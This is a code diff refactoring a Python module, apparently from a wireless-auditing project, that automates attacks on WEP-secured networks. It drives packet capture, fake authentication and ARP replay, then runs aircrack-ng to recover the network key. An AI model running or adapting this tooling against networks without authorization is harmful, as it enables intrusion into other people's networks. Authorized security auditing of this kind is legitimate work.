@@ -22,7 +22,12 @@ Martin Vondracek
   reaction was performed.
 
 """
+import logging
+import os
 import re
+import subprocess
+import tempfile
+import time
 from enum import Enum, unique
 
 from common import WirelessCapturer
@@ -382,10 +387,9 @@ class WepCracker(object):
     `aircrack-ng[Aircrack-ng] <http://www.aircrack-ng.org/doku.php?id=aircrack-ng>`_
     """
 
-    def __init__(self, cap_filepath, ap, dir_network_path):
+    def __init__(self, cap_filepath, ap):
         self.cap_filepath = cap_filepath
         self.ap = ap
-        self.dir_network_path = dir_network_path
 
         self.process = None
 
@@ -394,7 +398,7 @@ class WepCracker(object):
                '-a', '1',
                '--bssid', self.ap.bssid,
                '-q',  # If set, no status information is displayed.
-               '-l', os.path.join(self.dir_network_path, 'WEP_key.hex'),  # Write the key into a file.
+               '-l', self.ap.cracked_psk_path,  # Write the key into a file.
                self.cap_filepath]
         self.process = subprocess.Popen(cmd)
         logging.debug('WepCracker started')
@@ -418,29 +422,27 @@ class WepCracker(object):
             self.process = None
             return exitcode
 
-    def has_key(self):
-        return os.path.isfile(os.path.join(self.dir_network_path, 'WEP_key.hex'))
-
 
 class WepAttacker(object):
     """
     Main class providing attack on WEP secured network.
     """
 
-    def __init__(self, dir_network_path, ap, if_mon):
-        if not os.path.isdir(dir_network_path):
-            raise NotADirectoryError('Provided dir_network_path is not a directory.')
-        self.dir_network_path = dir_network_path
-
+    def __init__(self, ap, if_mon):
         self.ap = ap
         self.if_mon = if_mon
         self.if_mon_mac = '00:36:76:54:b2:95'  # TODO (xvondr20) Get real MAC address of if_mon interface.
 
-    def start(self):
+    def start(self, force=False):
         """
         Start attack on WEP secured network.
-        :return:
+        If targeted network have already been cracked and `force` is False, attack is skipped.
+        :param force: attack even if network have already been cracked
         """
+        if not force and self.ap.is_cracked():
+            #  AP already cracked
+            logging.info('Known ' + str(self.ap))
+            return
         with tempfile.TemporaryDirectory() as tmp_dirname:
             capturer = WirelessCapturer(tmp_dir=tmp_dirname, interface=self.if_mon)
             capturer.start(self.ap)
@@ -456,12 +458,10 @@ class WepAttacker(object):
             # some time to create capturecapturer.capturing_cap_path
             time.sleep(6)
 
-            cracker = WepCracker(cap_filepath=capturer.capturing_cap_path,
-                                 ap=self.ap,
-                                 dir_network_path=self.dir_network_path)
+            cracker = WepCracker(cap_filepath=capturer.capturing_cap_path, ap=self.ap)
             cracker.start()
 
-            while not cracker.has_key():
+            while not self.ap.is_cracked():
                 fake_authentication.update_state()
                 logging.debug('FakeAuthentication: ' + str(fake_authentication.state) + ', ' +
                               'flags: ' + str(fake_authentication.flags)
@@ -475,6 +475,7 @@ class WepAttacker(object):
 
                 logging.debug('#IV = ' + str(capturer.get_iv_sum()))
                 time.sleep(5)
+            logging.info('Cracked ' + str(self.ap))
 
             capturer.stop()
             arp_replay.stop()
